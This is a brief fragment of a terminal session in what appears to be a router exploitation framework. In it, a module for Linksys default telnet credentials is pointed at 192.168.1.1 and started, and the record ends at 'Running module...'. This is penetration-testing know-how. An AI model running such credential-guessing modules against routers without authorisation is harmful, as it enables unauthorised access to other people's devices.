...
```
exf > use creds/routers/linksys/telnet_default_creds
exf (Linksys Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (Linksys Router Default Telnet Creds) > run
[*] Running module...
